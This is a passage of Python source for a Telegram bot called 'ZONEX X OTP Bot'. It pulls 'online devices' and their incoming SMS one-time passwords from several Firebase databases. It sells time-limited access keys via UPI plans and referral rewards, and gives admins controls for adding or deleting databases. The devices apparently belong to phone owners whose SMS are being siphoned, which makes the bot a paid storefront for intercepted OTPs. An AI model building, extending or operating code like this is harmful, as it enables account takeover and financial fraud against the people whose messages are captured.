         InlineKeyboardButton("💰 Buy Key",      callback_data="buy")],
        [InlineKeyboardButton("👥 Refer & Earn", callback_data="refer"),
         InlineKeyboardButton("🏠 Menu",         callback_data="main_menu")],
    ])

def kb_expired() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Buy Key",       callback_data="buy"),
         InlineKeyboardButton("👥 Refer & Earn",  callback_data="refer")],
    ])

def kb_plans_user() -> InlineKeyboardMarkup:
    plans = data.get("pricing_plans", [])
    rows = []
    for p in plans:
        h = p['hours']
        if h >= 720:   dur = f"{int(h//720)} Month"
        elif h >= 168: dur = f"{int(h//168)} Week"
        elif h >= 24:  dur = f"{int(h//24)} Din"
        else:          dur = f"{h}h"
        rows.append([InlineKeyboardButton(
            f"📦 {dur}  ·  {int(h)}h  ·  ₹{p['price']}",
            callback_data=f"buy_plan:{p['id']}")])
    rows.append([InlineKeyboardButton("◀️ KEY SYSTEM", callback_data="user_panel")])
    return InlineKeyboardMarkup(rows)

def kb_admin() -> InlineKeyboardMarkup:
    pending_count = sum(1 for p in data.get("pending_payments", {}).values()
                        if p.get("status") == "pending")
    pend_label = f"📋 Payments ({pending_count})" if pending_count else "📋 Payments"
    maint = data.get("maintenance", False)
    maint_label = "🟢 Maintenance: OFF" if not maint else "🔴 Maintenance: ON"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Firebase DBs",    callback_data="adm_firebase"),
         InlineKeyboardButton("👥 Users",           callback_data="adm_users")],
        [InlineKeyboardButton("💰 Pricing Plans",   callback_data="adm_plans"),
         InlineKeyboardButton("📢 Broadcast",       callback_data="adm_broadcast")],
        [InlineKeyboardButton("⏱ Time (Add/Ghata)", callback_data="adm_add_time"),
         InlineKeyboardButton("📊 Stats",           callback_data="stats")],
        [InlineKeyboardButton("🎁 Refer Reward",    callback_data="adm_refer_hours"),
         InlineKeyboardButton("💳 Set UPI",         callback_data="adm_set_upi")],
        [InlineKeyboardButton("📸 Set QR Code",     callback_data="adm_set_qr"),
         InlineKeyboardButton(pend_label,           callback_data="adm_pending")],
        [InlineKeyboardButton("🚫 Ban / Unban",     callback_data="adm_ban_list"),
         InlineKeyboardButton(maint_label,          callback_data="adm_maintenance")],
        [InlineKeyboardButton("🏠 Menu",            callback_data="main_menu")],
    ])

def _fb_online_count(label: str) -> int:
    """Online device count for one Firebase label."""
    return sum(
        1 for d in device_cache.get(label, {}).values()
        if d.get("online") and _has_valid_phone(d)
    )

def _fb_total_count(label: str) -> int:
    return len(device_cache.get(label, {}))

def txt_firebase_panel() -> str:
    """Detailed Firebase management panel text."""
    total_on  = count_online()
    total_dev = count_total()
    total_dbs = len(data["firebase_configs"])
    lines = [
        "🔥 <b>Firebase Management</b>",
        f"{'━'*28}",
        f"📊 DBs: <b>{total_dbs}</b>  ·  🟢 Online: <b>{total_on}</b>  ·  📱 Total: <b>{total_dev}</b>",
        f"🕐 Last Global Sync: <code>{last_refresh}</code>",
        f"{'─'*28}",
    ]
    for i, cfg in enumerate(data["firebase_configs"], 1):
        lb      = cfg["label"]
        on_c    = _fb_online_count(lb)
        tot_c   = _fb_total_count(lb)
        key_txt = "🔑 Key" if cfg.get("key") else "🌐 Public"
        st      = fb_conn_status.get(lb, "")
        st_icon = "🟢" if st == "ok" else ("🔴" if st in ("error", "auth", "timeout") else "⏳")
        sync_t  = fb_last_sync.get(lb, "—")
        lines.append(
            f"{i}. {st_icon} <b>{lb}</b>  [{key_txt}]\n"
            f"   🟢 <code>{on_c}</code> online · 📱 <code>{tot_c}</code> total · 🕐 <code>{sync_t}</code>"
        )
    return "\n".join(lines)

def kb_firebase() -> InlineKeyboardMarkup:
    rows = []
    for i, cfg in enumerate(data["firebase_configs"]):
        lb      = cfg["label"]
        on_c    = _fb_online_count(lb)
        tot_c   = _fb_total_count(lb)
        st      = fb_conn_status.get(lb, "")
        st_icon = "🟢" if st == "ok" else ("🔴" if st in ("error","auth","timeout") else "⏳")
        key_icon = "🔑" if cfg.get("key") else "🌐"
        rows.append([
            InlineKeyboardButton(
                f"{st_icon} {lb} {key_icon} · 🟢{on_c}/📱{tot_c}",
                callback_data="noop"
            ),
            InlineKeyboardButton("🗑 Del", callback_data=f"fb_del:{i}"),
        ])
    rows.append([
        InlineKeyboardButton("➕ Add Firebase", callback_data="fb_add"),
        InlineKeyboardButton("📦 Bulk Add",     callback_data="fb_bulk_add"),
    ])
    rows.append([
        InlineKeyboardButton("🔄 Refresh",  callback_data="fb_refresh"),
        InlineKeyboardButton("◀️ Admin",    callback_data="admin"),
    ])
    return InlineKeyboardMarkup(rows)

def kb_plans_admin() -> InlineKeyboardMarkup:
    rows = []
    for i, p in enumerate(data.get("pricing_plans",[])):
        rows.append([
            InlineKeyboardButton(f"📦 {p['label']} · {p['hours']}h · ₹{p['price']}", callback_data="noop"),
            InlineKeyboardButton("🗑", callback_data=f"plan_del:{i}"),
        ])
    rows.append([InlineKeyboardButton("➕ Add Plan", callback_data="plan_add"),
                 InlineKeyboardButton("◀️ Admin",    callback_data="admin")])
    return InlineKeyboardMarkup(rows)

# ─── /start ───────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user  = update.effective_user
    uid   = user.id
    name  = user.first_name or "User"
    uname = user.username or name

    ref_uid = None
    for arg in (ctx.args or []):
        if arg.startswith("ref_"):
            try:
                r = int(arg[4:])
                if r != uid: ref_uid = r
            except: pass

    if is_admin(uid):
        ensure_user(uid, uname, name)
        await update.message.reply_chat_action("typing")
        if not device_cache:
            asyncio.create_task(refresh_all())
        await update.message.reply_text(
            txt_welcome_panel(name, uid), reply_markup=kb_main(uid), parse_mode="HTML")
        return ConversationHandler.END

    if is_banned(uid):
        await update.message.reply_text(
            "🚫 <b>Access Denied</b>\n\n"
            "Tumhara account ban kar diya gaya hai.\n"
            f"<i>Admin se contact karo: {ADMIN_USERNAME}</i>",
            parse_mode="HTML"
        )
        return ConversationHandler.END

    if data.get("maintenance", False):
        await update.message.reply_text(
            "🔧 <b>Bot Maintenance Mode</b>\n"
            f"{'━'*28}\n\n"
            "⚙️ Bot abhi maintenance mein hai.\n"
            "Kuch der baad wapas aao! 🙏\n\n"
            f"<i>Help ke liye contact karo: {ADMIN_USERNAME}</i>",
            parse_mode="HTML"
        )
        return ConversationHandler.END

    ensure_user(uid, uname, name, referred_by=ref_uid)
    u = data["users"][str(uid)]

    await update.message.reply_chat_action("typing")

    all_joined, missing = await check_channels(ctx.bot, uid)
    if not all_joined:
        await update.message.reply_text(
            f"🤖 <b>ZONEX X OTP Bot</b>\n"
            f"{'━'*28}\n\n"
            f"👋 <b>Welcome {name}!</b>\n\n"
            f"Bot use karne ke liye pehle\n"
            f"yeh channels join karo 👇",
            parse_mode="HTML",
            reply_markup=kb_channels(missing)
        )
        return ConversationHandler.END

    if not u.get("channels_done"):
        add_hours(uid, WELCOME_HOURS)
        u["channels_done"] = True
        u["key_verified"]  = False
        save_data(data)

        key = get_key(uid)

        if ref_uid and str(ref_uid) in data["users"]:
            rh = get_referral_hours()
            add_hours(ref_uid, rh)
            data["users"][str(ref_uid)]["referral_count"] = \
                data["users"][str(ref_uid)].get("referral_count", 0) + 1
            save_data(data)
            try:
                await ctx.bot.send_message(
                    ref_uid,
                    f"🎉 <b>Referral Bonus!</b>\n\n"
                    f"Tumhare referral <b>{name}</b> ne join kar liya!\n"
                    f"⏱ <b>+{rh:.0f} Hour</b> add hua tumhare account mein!",
                    parse_mode="HTML"
                )
            except: pass

        await update.message.reply_text(
            f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
            f"{'━'*28}\n\n"
            f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
            f"{'─'*28}\n"
            f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
            f"<code>{key}</code>\n\n"
            f"{'─'*28}\n"
            f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
            f"<i>Panel turant khul jaayega ⚡</i>",
            parse_mode="HTML"
        )
        return WAIT_KEY

    if not u.get("key_verified"):
        key = get_key(uid)
        await update.message.reply_text(
            f"🗝 <b>Key Verification</b>\n"
            f"{'━'*28}\n\n"
            f"Apni key copy karo aur yahan bhejo:\n\n"
            f"<code>{key}</code>\n\n"
            f"{'─'*28}\n"
            f"<i>Key bhejne ke baad panel khul jaayega ⚡</i>",
            parse_mode="HTML"
        )
        return WAIT_KEY

    if not has_access(uid):
        await update.message.reply_text(
            txt_expired(name),
            parse_mode="HTML",
            reply_markup=kb_expired()
        )
        return ConversationHandler.END

    if not device_cache:
        await refresh_all()
    await update.message.reply_text(
        txt_welcome_panel(name, uid), reply_markup=kb_main(uid), parse_mode="HTML")
    return ConversationHandler.END

# ─── Key entry handler ────────────────────────────────────────────────────────
async def handle_key_entry(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    name = update.effective_user.first_name or "User"
    text = update.message.text.strip()
    correct_key = get_key(uid)

    if text.upper() != correct_key.upper():
        await update.message.reply_text(
            f"❌ <b>Galat Key!</b>\n\n"
            f"Apni sahi key neeche se copy karke send karo:\n\n"
            f"<code>{correct_key}</code>",
            parse_mode="HTML"
        )
        return WAIT_KEY

    data["users"][str(uid)]["key_verified"] = True
    save_data(data)

    if not device_cache:
        await update.message.reply_text("⏳ Data load ho raha hai...", parse_mode="HTML")
        await refresh_all()

    await update.message.reply_text(
        f"✅ <b>Key Verified!</b> Panel khul gaya 🎉\n"
        f"{'━'*28}\n\n"
        + txt_welcome_panel(name, uid),
        reply_markup=kb_main(uid),
        parse_mode="HTML"
    )
    return ConversationHandler.END

# ─── Button handler ───────────────────────────────────────────────────────────
async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global last_refresh
    q   = update.callback_query
    cb  = q.data
    uid = q.from_user.id
    nm  = q.from_user.first_name

    if not is_admin(uid) and is_banned(uid):
        await q.answer("🚫 Tumhara account ban hai!", show_alert=True)
        return

    if data.get("maintenance", False) and not is_admin(uid):
        await q.answer("🔧 Bot maintenance mein hai! Baad mein aao.", show_alert=True)
        return

    if   cb == "refresh":             await q.answer("🔄 Refreshing...")
    elif cb.startswith("online:"):    await q.answer("📱 Loading devices...")
    elif cb.startswith("rfr:"):       await q.answer("🔍 Checking OTP...")
    elif cb.startswith("pgsel:"):     await q.answer("📄 Page choose karo")
    elif cb.startswith("allotp:"):    await q.answer("📩 Loading OTPs...")
    elif cb.startswith("dev:"):       await q.answer("📱 Opening device...")
    elif cb == "stats":               await q.answer("📊 Loading stats...")
    elif cb == "user_panel":          await q.answer("🔑 Opening panel...")
    elif cb == "buy":                 await q.answer("💰 Loading plans...")
    elif cb.startswith("buy_plan:"): await q.answer("📦 Plan details...")
    elif cb == "refer":               await q.answer("👥 Refer & Earn...")
    elif cb == "admin":               await q.answer("👑 Admin Panel")
    elif cb.startswith("pay_ok:"):    await q.answer("✅ Processing...", show_alert=False)
    elif cb.startswith("pay_no:"):    await q.answer("❌ Processing...", show_alert=False)
    elif cb == "main_menu":                 await q.answer("🏠 Menu")
    elif cb == "my_key":                    await q.answer("🗝 My Key")
    elif cb == "fb_refresh":                await q.answer("🔄 Refreshing Firebase...")
    elif cb.startswith("fb_del:"):          await q.answer("⚠️ Confirm delete?")
    elif cb.startswith("fb_del_ok:"):       await q.answer("🗑 Deleting...")
    elif cb == "fb_del_cancel":             await q.answer("✅ Cancelled")
    elif cb == "noop":                      await q.answer()
    else:                                   await q.answer()

    # ── Check channels callback ──────────────────────────────────────────────
    if cb == "check_join":
        all_joined, missing = await check_channels(ctx.bot, uid)
        if not all_joined:
            names = ", ".join(f"@{c}" for c in missing)
            try:
                await q.answer(f"❌ Abhi bhi join nahi kiya: {names}", show_alert=True)
            except Exception:
                try:
                    await q.edit_message_text(
                        f"⚠️ <b>Pehle in channels ko join karo:</b>\n\n"
                        + "\n".join(f"• @{c}" for c in missing)
                        + "\n\n<i>Join karne ke baad ✅ Continue Verify dabao.</i>",
                        reply_markup=q.message.reply_markup,
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
            return
        u = data["users"].get(str(uid))
        if not u:
            ensure_user(uid, q.from_user.username or nm, nm)
            u = data["users"][str(uid)]

        ref_uid = u.get("referred_by")
        if not u.get("channels_done"):
            add_hours(uid, WELCOME_HOURS)
            u["channels_done"] = True
            u["key_verified"]  = False
            save_data(data)
            key = get_key(uid)
            await q.edit_message_text(
                f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
                f"{'━'*28}\n\n"
                f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
                f"{'─'*28}\n"
                f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
                f"<code>{key}</code>\n\n"
                f"{'─'*28}\n"
                f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
                f"<i>Panel turant khul jaayega ⚡</i>",
                parse_mode="HTML"
            )
            ctx.user_data["waiting_key"] = True

            if ref_uid and str(ref_uid) in data["users"]:
                rh = get_referral_hours()
                add_hours(ref_uid, rh)
                data["users"][str(ref_uid)]["referral_count"] = \
                    data["users"][str(ref_uid)].get("referral_count", 0) + 1
                save_data(data)
                try:
                    await ctx.bot.send_message(
                        ref_uid,
                        f"🎉 <b>Referral Bonus!</b>\n\n"
                        f"Tumhara referral join ho gaya!\n"
                        f"⏱ <b>+{rh:.0f} Hour</b> add hua!",
                        parse_mode="HTML"
                    )
                except: pass
        else:
            ctx.user_data["waiting_key"] = True
            key = get_key(uid)
            await q.edit_message_text(
                f"🗝 <b>Key Verification</b>\n"
                f"{'━'*28}\n\n"
                f"Apni key copy karo aur yahan bhejo:\n\n"
                f"<code>{key}</code>\n\n"
                f"{'─'*28}\n"
                f"<i>Key bhejne ke baad panel khul jaayega ⚡</i>",
                parse_mode="HTML"
            )
        return

    # ── Access check (non-admin users) ──────────────────────────────────────
    if (not is_admin(uid) and not has_access(uid)
            and cb not in ("buy","refer","noop","check_join")
            and not cb.startswith("buy_plan:")):
        await q.answer("❌ Access expired! Plan kharido ya refer karo.", show_alert=True)
        await q.edit_message_text(
            txt_expired(nm),
            parse_mode="HTML",
            reply_markup=kb_expired()
        )
        return

    # ── Main Menu ────────────────────────────────────────────────────────────
    if cb == "main_menu":
        await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
                                   parse_mode="HTML")

    elif cb.startswith("pgsel:"):
        parts    = cb.split(":")
        cur_page = int(parts[1]) if len(parts) > 2 else 0
        total    = int(parts[2]) if len(parts) > 2 else int(parts[1])
        rows     = []
        row      = []
        for p in range(total):
            label = f"✅ {p+1}" if p == cur_page else str(p+1)
            row.append(InlineKeyboardButton(label, callback_data=f"online:{p}"))
            if len(row) == 5:
                rows.append(row)
                row = []
        if row:
            rows.append(row)
        rows.append([InlineKeyboardButton("◀️ Back", callback_data=f"online:{cur_page}")])
        try:
            await q.edit_message_text(
                f"📄 <b>Page Select karo</b>\n"
                f"<i>Total {total} pages available hai</i>",
                reply_markup=InlineKeyboardMarkup(rows),
                parse_mode="HTML")
        except Exception:
            pass

    elif cb.startswith("online:"):
        pg = int(cb.split(":")[1])
        try:
            await q.edit_message_text(
                "🔄 <b>Syncing all Firebase DBs…</b>\n\n"
                "<i>Ek second — sab ka data akatha ho raha hai.</i>",
                parse_mode="HTML")
        except Exception:
            pass
        async def _safe_clients(cfg):
            try: await refresh_clients_only(cfg)
            except Exception as e: logger.warning(f"clients refresh [{cfg['label']}]: {e}")
        await asyncio.gather(*[_safe_clients(cfg) for cfg in data["firebase_configs"]])
        devs = all_online()
        if not devs:
            await q.edit_message_text(
                "🔴 <b>Koi device online nahi</b>\n\n"
                "<i>Devices aate hi yahan dikh jaayengi.</i>",
                reply_markup=kb_back(), parse_mode="HTML"); return
        await q.edit_message_text(
            f"📱 <b>Online Devices</b>  ·  <code>{len(devs)}</code> active\n"
            f"<i>🕐 Sync: {now_dt().strftime('%H:%M:%S')}</i>",
            reply_markup=kb_online(devs, pg), parse_mode="HTML")

    elif cb.startswith("dev:"):
        parts = cb.split(":", 3)
        esc   = parts[1]
        did   = parts[2]
        page  = int(parts[3]) if len(parts) > 3 else 0
        lb    = resolve_label(esc)
        try:
            await q.edit_message_text(txt_device_card(lb, did),
                                       reply_markup=kb_device(lb, did, page), parse_mode="HTML")
        except Exception:
            pass

    elif cb.startswith("rfr:"):
        parts = cb.split(":", 3)
        esc   = parts[1]
        did   = parts[2]
        page  = int(parts[3]) if len(parts) > 3 else 0
        lb    = resolve_label(esc)
        cfg   = next((c for c in data["firebase_configs"] if c["label"]==lb), None)
        devinfo = device_cache.get(lb, {}).get(did, {})

        try:
            await q.edit_message_text(txt_device_card(lb, did),
                                      reply_markup=kb_device(lb, did, page),
                                      parse_mode="HTML")
        except Exception as _e:
            logger.warning(f"rfr card edit: {_e}")

        # ── Snapshot cache BEFORE fetch (auto_fetch keeps it current every 10s) ─
        pre_otps = otp_cache.get(lb, {}).get(did, [])
        pre_key  = (pre_otps[0]["otp"], pre_otps[0]["sender"], pre_otps[0]["time"]) \
                   if pre_otps else None

        # ── Fetch fresh OTPs from Firebase ────────────────────────────────────
        fresh_otps = list(pre_otps)
        if cfg:
            try:
                fetched, _ = await fetch_otps(cfg["url"], cfg.get("key",""), did)
                if fetched:
                    otp_cache.setdefault(lb, {})[did] = fetched
                    fresh_otps = fetched
            except Exception as fe:
                logger.warning(f"rfr fetch: {fe}")

        # ── Decide: is the top OTP "fresh enough" to alert? ──────────────────
        # Fresh = arrived within last 30s (by timestamp) OR is brand-new vs cache
        # This handles 4/5/6/8-digit OTPs regardless of timestamp parse success.
        tap_time = now_dt()
        cutoff   = tap_time - timedelta(seconds=30)

        otp_to_show = None
        if fresh_otps:
            top = fresh_otps[0]
            top_key = (top["otp"], top["sender"], top["time"])
            top_dt  = top.get("_dt")
            is_recent  = (top_dt is not None and top_dt >= cutoff)
            is_new_otp = (top_key != pre_key)          # not in cache at tap time → new
            if is_recent or is_new_otp:
                otp_to_show = top

        # ── If nothing fresh yet, wait up to 30s for a brand-new OTP ─────────
        if otp_to_show is None and cfg:
            known_key = (fresh_otps[0]["otp"], fresh_otps[0]["sender"], fresh_otps[0]["time"]) \
                        if fresh_otps else None
            deadline = asyncio.get_event_loop().time() + 30
            while asyncio.get_event_loop().time() < deadline:
                await asyncio.sleep(3)
                try:
                    polled, _ = await fetch_otps(cfg["url"], cfg.get("key",""), did)
                except Exception:
                    polled = []
                if polled:
                    otp_cache.setdefault(lb, {})[did] = polled
                    top     = polled[0]
                    top_key = (top["otp"], top["sender"], top["time"])
                    # Any OTP different from what was there at tap time is brand-new
                    if top_key != known_key:
                        otp_to_show = top
                        break

        # ── Send alert only if we found a fresh / new OTP ─────────────────────
        if otp_to_show:
            devinfo = device_cache.get(lb, {}).get(did, devinfo)
            try:
                await ctx.bot.send_message(
                    uid, txt_otp_alert(lb, did, otp_to_show, devinfo), parse_mode="HTML")
            except Exception as ae:
                logger.warning(f"rfr alert: {ae}")
            try:
                await q.edit_message_text(txt_device_card(lb, did),
                                          reply_markup=kb_device(lb, did, page),
                                          parse_mode="HTML")
            except Exception:
                pass

    elif cb.startswith("allotp:"):
        parts = cb.split(":", 3)
        esc   = parts[1]
        did   = parts[2]
        page  = int(parts[3]) if len(parts) > 3 else 0
        lb    = resolve_label(esc)
        otps  = otp_cache.get(lb, {}).get(did, [])
        if not otps:
            txt = f"📩 <b>OTPs</b> — <code>{did[:16]}</code>\n\n❌ Koi OTP nahi."
        else:
            lines = [f"📩 <b>All OTPs</b> — <code>{did[:16]}</code>\n{'─'*28}\n"]
            for i, e in enumerate(otps, 1):
                lines.append(
                    f"\n<b>#{i}</b> 🔢 <code>{e['otp']}</code>\n"
                    f"   📤 {e['sender']}  ⏰ {e['time']}\n"
                    f"   💬 <i>{e['msg'][:80]}{'…' if len(e['msg'])>80 else ''}</i>")
            txt = "".join(lines)
        await q.edit_message_text(
            txt,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ Back", callback_data=f"dev:{esc}:{did}:{page}")
            ]]),
            parse_mode="HTML")

    elif cb == "stats":
        await q.edit_message_text(txt_stats(), reply_markup=kb_back(), parse_mode="HTML")

    elif cb == "refresh":
        await q.edit_message_text(
            "🔄 <b>Syncing with Firebase...</b>\n\n<i>Ek second...</i>", parse_mode="HTML")
        await refresh_all()
        await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
                                   parse_mode="HTML")

    # ── User Panel ───────────────────────────────────────────────────────────
    elif cb == "user_panel":
        if is_admin(uid):
            await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
                                       parse_mode="HTML"); return
        await q.edit_message_text(txt_user_panel(uid), reply_markup=kb_user_panel(),
                                   parse_mode="HTML")

    elif cb == "my_key":
        key = get_key(uid)
        tl  = time_left_detailed(uid)
        await q.edit_message_text(
            f"🔑 <b>Tumhari Permanent Key</b>\n\n"
            f"<code>{key}</code>\n\n"
            f"⏱ Access: <b>{tl}</b>\n\n"
            f"<i>⚠️ Yeh key sirf tumhari hai. Share mat karna.\n"
            f"Kabhi nahi badlegi.</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ My Panel", callback_data="user_panel")
            ]]),
            parse_mode="HTML")

    elif cb == "buy":
        plans = data.get("pricing_plans", [])
        if not plans:
            await q.edit_message_text(
                f"💰 Koi plan available nahi hai abhi.\n👑 Contact: {ADMIN_USERNAME}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("◀️ KEY SYSTEM", callback_data="user_panel")
                ]]))
            return
        await q.edit_message_text(
            f"💰 <b>Buy Key — Plans</b>\n{'─'*28}\n\n"
            f"Niche se apna plan choose karo 👇\n\n"
            f"<i>Plan pe tap karo — QR, UPI aur details dekhne ke liye.</i>",
            reply_markup=kb_plans_user(),
            parse_mode="HTML")

    elif cb.startswith("buy_plan:"):
        plan_id = cb.split(":", 1)[1]
        plans   = data.get("pricing_plans", [])
        plan    = next((p for p in plans if p["id"] == plan_id), None)
        if not plan:
            await q.answer("❌ Plan nahi mila!", show_alert=True); return
        h     = plan["hours"]
        price = plan["price"]
        if h >= 720:   dur = f"{int(h//720)} Month ({int(h)}h)"
        elif h >= 168: dur = f"{int(h//168)} Week ({int(h)}h)"
        elif h >= 24:  dur = f"{int(h//24)} Din ({int(h)}h)"
        else:          dur = f"{h}h"
        exp_if_bought = now_dt() + timedelta(hours=h)
        exp_str = exp_if_bought.strftime('%d/%m/%Y %H:%M')
        upi        = data.get("upi_id", "")
        qr_file_id = data.get("qr_file_id", "")
        detail_txt = (
            f"📦 <b>{dur} Plan</b>\n{'─'*28}\n\n"
            f"⏱ <b>Duration :</b> {int(h)} Hours\n"
            f"💵 <b>Price    :</b> ₹{price}\n"
            f"📅 <b>Expiry   :</b> <code>{exp_str}</code>\n\n"
            f"{'─'*28}\n"
            + (f"💳 <b>UPI ID:</b> <code>{upi}</code>\n\n" if upi else "")
            + f"<b>Payment kaise karo?</b>\n"
              f"1️⃣ UPI se ₹{price} bhejo\n"
              f"2️⃣ Screenshot lo\n"
              f"3️⃣ <b>Niche screenshot bhejo 👇</b>\n\n"
              f"<i>Admin approve karega → Access automatic add ho jaayega!</i>"
        )
        kb_detail = InlineKeyboardMarkup([[
            InlineKeyboardButton("◀️ Plans",   callback_data="buy"),
            InlineKeyboardButton("🏠 Menu",    callback_data="main_menu"),
        ]])
        ctx.user_data["awaiting_payment_screenshot"] = plan_id
        if qr_file_id:
            try:
                await q.message.reply_photo(
                    photo=qr_file_id, caption=detail_txt,
                    parse_mode="HTML", reply_markup=kb_detail)
                await q.message.delete()
            except:
                await q.edit_message_text(detail_txt, parse_mode="HTML", reply_markup=kb_detail)
        else:
            await q.edit_message_text(detail_txt, parse_mode="HTML", reply_markup=kb_detail)

    elif cb == "refer":
        bot_info = await ctx.bot.get_me()
        link = f"https://t.me/{bot_info.username}?start=ref_{uid}"
        u    = data["users"].get(str(uid), {})
        refs = u.get("referral_count", 0)
        rh   = get_referral_hours()
        await q.edit_message_text(
            f"👥 <b>Refer & Earn</b>\n\n"
            f"Har successful referral pe <b>+{rh:.0f} Hour</b> FREE access!\n\n"
            f"🔗 <b>Tumhara Referral Link:</b>\n<code>{link}</code>\n\n"
            f"✅ Successful referrals : <b>{refs}</b>\n"
            f"⏱ Total earned         : <b>{int(refs*rh)}h</b>\n\n"
            f"<i>Credit tab milega jab dusra banda\n"
            f"dono channels join kar le aur bot start kare.</i>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ My Panel", callback_data="user_panel")
            ]]),
            parse_mode="HTML")

    # ══ ADMIN ════════════════════════════════════════════════════════════════
    elif cb == "admin":
        if not is_admin(uid): await q.answer("⛔ Access Denied!", show_alert=True); return
        active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
        rh = get_referral_hours()
        await q.edit_message_text(
            f"👑 <b>Admin Panel</b>\n{'─'*28}\n"
            f"🟢 Online : <code>{count_online()}</code>   📱 Total  : <code>{count_total()}</code>\n"
            f"🔑 OTPs   : <code>{count_otps()}</code>     👥 Users  : <code>{len(data['users'])}</code>\n"
            f"✅ Active : <code>{active}</code>            🔥 DBs    : <code>{len(data['firebase_configs'])}</code>\n"
            f"🎁 Refer  : <code>{rh:.0f}h</code> per referral\n"
            f"🕐 Refresh: <code>{last_refresh}</code>",
            reply_markup=kb_admin(), parse_mode="HTML")

    # Admin: Firebase Management Panel
    elif cb == "adm_firebase":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        try:
            await q.edit_message_text(
                txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
        except Exception as e:
            logger.error(f"adm_firebase panel error: {e}")
            await q.edit_message_text(
                "❌ <b>Firebase panel load nahi hua.</b>\n\nError log mein hai.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔄 Retry", callback_data="adm_firebase"),
                    InlineKeyboardButton("◀️ Admin", callback_data="admin"),
                ]]),
                parse_mode="HTML")

    # Firebase: Delete — show confirmation first
    elif cb.startswith("fb_del:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        try:
            idx = int(cb.split(":")[1])
        except (IndexError, ValueError):
            await q.answer("❌ Invalid", show_alert=True); return
        configs = data["firebase_configs"]
        if idx < 0 or idx >= len(configs):
            await q.answer("❌ Firebase nahi mila!", show_alert=True); return
        if len(configs) <= 1:
            await q.answer("❌ Kam se kam ek Firebase rakhna zaroori hai!", show_alert=True); return
        cfg = configs[idx]
        lb  = cfg["label"]
        on_c  = _fb_online_count(lb)
        tot_c = _fb_total_count(lb)
        key_txt = "🔑 Key Protected" if cfg.get("key") else "🌐 Public"
        await q.edit_message_text(
            f"⚠️ <b>Firebase Delete Confirmation</b>\n"
            f"{'━'*28}\n\n"
            f"📝 Name   : <b>{lb}</b>\n"
            f"🌐 URL    : <code>{cfg['url']}</code>\n"
            f"🔑 Auth   : {key_txt}\n"
            f"🟢 Online : <code>{on_c}</code>\n"
            f"📱 Total  : <code>{tot_c}</code>\n\n"
            f"❗ <b>Isko delete karne ke baad yeh Firebase ka data\n"
            f"online system se bhi remove ho jaayega.</b>\n\n"
            f"Kya aap sure hain?",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Haan, Delete Karo", callback_data=f"fb_del_ok:{idx}")],
                [InlineKeyboardButton("❌ Cancel",            callback_data="fb_del_cancel")],
            ]))

    # Firebase: Delete confirmed
    elif cb.startswith("fb_del_ok:"):
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        try:
            idx = int(cb.split(":")[1])
        except (IndexError, ValueError):
            await q.answer("❌ Invalid", show_alert=True); return
        configs = data["firebase_configs"]
        if idx < 0 or idx >= len(configs):
            await q.answer("❌ Firebase nahi mila — shayad pehle se delete ho gaya!", show_alert=True)
            await q.edit_message_text(txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
            return
        if len(configs) <= 1:
            await q.answer("❌ Kam se kam ek Firebase rakhna zaroori hai!", show_alert=True); return
        removed = configs.pop(idx)
        save_data(data)
        lb = removed["label"]
        device_cache.pop(lb, None)
        otp_cache.pop(lb, None)
        fb_last_sync.pop(lb, None)
        fb_conn_status.pop(lb, None)
        logger.info(f"🗑 Firebase deleted by admin {uid}: {lb} ({removed['url']})")
        try:
            await q.edit_message_text(
                f"✅ <b>Firebase Deleted!</b>\n\n"
                f"📝 <b>{lb}</b> hata diya gaya.\n"
                f"🔥 Remaining DBs: <b>{len(data['firebase_configs'])}</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase"),
                    InlineKeyboardButton("◀️ Admin",         callback_data="admin"),
                ]]))
        except Exception:
            pass

    # Firebase: Cancel delete
    elif cb == "fb_del_cancel":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        await q.edit_message_text(
            txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")

    # Firebase: Refresh all and update panel
    elif cb == "fb_refresh":
        if not is_admin(uid): await q.answer("⛔", show_alert=True); return
        try:
            await q.edit_message_text(
                f"🔄 <b>Refreshing all Firebase DBs…</b>\n\n"
                f"<i>{len(data['firebase_configs'])} databases check ho rahe hain, ek second ruko.</i>",
                parse_mode="HTML")
        except Exception:
            pass
        async def _safe_refresh(cfg):
            try:
                await refresh_firebase(cfg)
            except Exception as e:
                fb_conn_status[cfg["label"]] = "error"
                logger.warning(f"fb_refresh [{cfg['label']}]: {e}")
